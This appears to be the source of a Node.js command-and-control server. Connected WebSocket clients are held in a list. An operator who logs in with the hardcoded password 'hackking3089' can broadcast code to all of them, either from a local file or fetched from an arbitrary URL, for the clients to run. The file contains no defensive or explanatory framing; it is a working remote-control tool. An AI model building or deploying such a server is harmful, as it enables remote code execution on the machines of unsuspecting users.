const express = require("express");
const uuid = require("uuid");
const readline = require('readline');
const path = require("path");
const fs = require("fs");
const axios = require("axios");

const app = express();
const port = process.env.PORT || 3000;
const expressWs = require('express-ws')(app);
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const exportFCF = [];
const cli = {};
var rfc_logs = false;
var currentadminwebsocket = null;

app.get("/",(req,res) => {
    res.send("Hello World");
});

app.get("/version-get",(req,res) => {
    res.send("1.0.3 (beta)");
});

app.ws("/full-control-function",(ws,req) => {
    const RandomUUIDv4 = uuid.v4();
    exportFCF[RandomUUIDv4] = ws;
    ws.on("close",() => {
        delete exportFCF[RandomUUIDv4];
    });
});

app.ws("/administer-control-login",(ws,req) => {
    var isadminister = false;
    ws.on("message",(msg) => {
        if(msg == "hackking3089"){
            currentadminwebsocket = ws;
            isadminister = true;
            ws.send("welcome-administer");
        };
        if (isadminister === true){
            str = msg.toString();
            if (str.trim().length > 0) {
                if (str.trim().toLowerCase().split(" ")[0] == "exit") {
                    cli.exit();
                } else if (str.trim().toLowerCase().split(" ")[0] == "help") {
                    cli.help();
                } else if (str.trim().toLowerCase().split(" ")[0] == "run_full_control") {
                    if (str.trim().toLowerCase().split(" ")[2] === undefined || str.trim().toLowerCase().split(" ")[2] !== "http_raw") {
                        if (str.trim().split(" ")[1] !== "" && str.trim().split(" ")[1] !== undefined && fs.existsSync(__dirname + "/" + str.trim().split(" ")[1])) {
                            cli.rfc(fs.readFileSync(path.join(__dirname + "/" + str.trim().split(" ")[1]),{encoding:'utf8'}));
                        }else{
                            cli.message("Incorrect path");
                        };
                    }else{
                        axios.get(str.trim().split(" ")[1]).then((res) => {
                            cli.rfc(res.data);
                        }).catch((err) => {
                            cli.message("Error Log,");
                            cli.message(err);
                        });
                    };
                } else if (str.trim().toLowerCase().split(" ")[0] == "rfc_logs") {
                    cli.rfclogs(str.trim().split(" ")[1]);
                } else if (str.trim().toLowerCase().split(" ")[0] == "connect_clients_logs") {
                    cli.lsacc();
                } else {
                    cli.message(`Not Found "${str.trim()}" In CLI,\nUse "help" to see all available commands`);
                };
            };
        };
    });
    ws.on("close",() => {
        currentadminwebsocket = null;
    });
});

cli.message = (msg) => {
    if (currentadminwebsocket !== null) {
        currentadminwebsocket.send(msg);
    }
};

cli.rfc = (loadstringsend) => {
    cli.message("Sending command to all connected clients...");
    Object.keys(exportFCF).forEach((UUIDv4) => {
        if (rfc_logs) {
            cli.message("Sending command to client: " + UUIDv4);
        };
        exportFCF[UUIDv4].send(loadstringsend);
    });
};

cli.rfclogs = (boolstr) => {
    if (boolstr === "true") {
        cli.message("rfclogs is true");
        rfc_logs = true;
    } else if (boolstr === "false") {
        cli.message("rfclogs is false");
        rfc_logs = false;
    } else {
        cli.message("Incorrect value");
    };
};

cli.lsacc = () => {
    Object.keys(exportFCF).forEach((UUIDv4) => {
        cli.message("Logs client: " + UUIDv4);
    });
};

cli.exit = () => {
    process.exit(0);
};

app.listen(port,() => {
    console.log("Server is running on port " + port);
});